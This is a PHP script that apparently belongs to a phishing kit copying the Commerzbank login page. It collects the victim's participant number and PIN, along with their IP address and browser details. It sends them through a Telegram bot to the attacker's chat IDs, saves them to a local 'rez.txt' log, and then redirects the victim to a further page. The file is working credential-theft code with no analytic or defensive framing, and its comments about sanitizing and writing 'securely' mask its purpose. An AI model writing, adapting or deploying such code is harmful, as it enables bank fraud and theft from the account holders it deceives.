﻿<?php
session_start();
if (empty($_POST['teilnehmer'])) {
    header('location: ../');
    exit();
}

include "../config/telegram.php";
include "../config/settings.php";

// Sanitize inputs
$_SESSION['user'] = htmlspecialchars($_POST['teilnehmer']);
$teilnehmer = htmlspecialchars($_POST['teilnehmer'] ?? '');
$pin = htmlspecialchars($_POST['pin'] ?? '');
$selec = htmlspecialchars($_POST['selec'] ?? '');
$ip = getenv("REMOTE_ADDR");

// Get user OS and browser info
$user_os = php_uname('s');
$user_browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Browser';

// Prepare the message
$message = "[=====>  🏦  Commerz  |  LOGIN  🏦  <=====]\n\n";
$message .= "[ 🤖 USER  :      $teilnehmer\n";
$message .= "[ 🔐 PIN :      $pin\n";
$message .= "[ 3  :      $selec\n\n";
$message .= "[=====> INFORMATION <=====]\n\n";
$message .= "[ IP :    $ip\n";
$message .= "[ OS :    $user_os\n";
$message .= "[ Browser :    $user_browser\n";
$message .= "[ UA :    $user_browser\n";

// Send message via Telegram
$website = "https://api.telegram.org/bot" . $botToken;
$params = [
    'chat_id' => $chatId,
    'text' => $message,
];

foreach ($IdTelegram as $chatId) {
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    if ($result === false) {
        error_log("cURL error: " . curl_error($ch));
    }
    curl_close($ch);
}

// Write to file securely
$myfile = fopen("rez.txt", "a+");
if ($myfile) {
    fwrite($myfile, $message);
    fclose($myfile);
} else {
    error_log("Failed to open rez.txt for writing.");
}

// Redirect to the next page
header("location: ../account_sessionAuth.php");
exit();
?>
